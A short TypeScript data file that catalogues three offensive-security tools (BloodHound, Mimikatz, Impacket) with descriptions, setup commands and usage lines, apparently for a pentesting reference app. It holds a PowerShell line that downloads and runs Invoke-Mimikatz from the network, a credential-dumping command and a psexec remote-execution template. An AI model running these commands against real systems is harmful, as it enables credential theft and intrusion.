// Defines the shape of a single tool object
export interface Tool {
  id: number;
  name: string;
  category: 'Reconnaissance' | 'Credential Access' | 'Privilege Escalation';
  description: string;
  setupCommand: string;
  commonUsage: string;
}

// This is our actual tool data
export const toolData: Tool[] = [
  {
    id: 1,
    name: 'BloodHound',
    category: 'Reconnaissance',
    description: 'Uses graph theory to reveal hidden relationships in Active Directory.',
    setupCommand: 'sudo apt update && sudo apt install bloodhound',
    commonUsage: 'neo4j console\nbloodhound --no-sandbox',
  },
  {
    id: 2,
    name: 'Mimikatz',
    category: 'Credential Access',
    description: 'A tool for extracting plaintext passwords, hashes, and Kerberos tickets from memory.',
    setupCommand: 'IEX (New-Object Net.WebClient).DownloadString(\'https://.../Invoke-Mimikatz.ps1\')',
    commonUsage: 'mimikatz # sekurlsa::logonpasswords',
  },
  {
    id: 3,
    name: 'Impacket',
    category: 'Privilege Escalation',
    description: 'A collection of Python classes for working with network protocols.',
    setupCommand: 'pip install impacket',
    commonUsage: 'impacket-psexec <DOMAIN>/<USER>@<HOST>',
  },
];